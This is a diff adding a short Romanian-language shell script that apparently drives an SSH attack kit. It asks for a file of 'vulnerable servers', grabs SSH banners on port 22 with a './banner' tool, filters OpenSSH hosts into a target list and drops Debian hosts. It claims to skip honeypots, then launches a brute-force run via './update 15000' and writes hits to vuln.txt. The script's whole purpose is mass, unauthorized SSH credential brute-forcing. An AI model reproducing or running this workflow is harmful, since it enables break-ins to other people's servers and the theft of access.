@@ -1,0 +1,31 @@
+echo "################################################################################"
+echo -e "                    O dam tare de data asta"
+echo "###############################################################################"
+sleep 5
+echo "V-am pregatit ceva mai special de data asta"
+sleep 5
+clear
+echo Rupem Scanul folosind doar banner si groot.
+sleep 1
+echo Toate skemele vor ramane "private" deocamdata.
+sleep 1
+read -p "Fisierul cu Servere Vulnerabile => " servere
+echo "Filtram cacatu asta de $servere, cu talent"
+sleep 4
+./banner $servere 22 5000
+echo " "
+echo " "
+echo "Am filtrat $servere cu succes! "
+echo "Am Filtrat Honeypot-urile"
+echo " "
+echo "Filtram si debianele..."
+cat banner.log |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> mfu.txt
+sed -i '/Debian/d' banner.log
+echo " "
+echo "BRUTE INCEPE"
+sleep 5
+echo "BRUTE STARTING!"
+clear
+./update 15000
+clear
+echo "Output saved in vuln.txt"
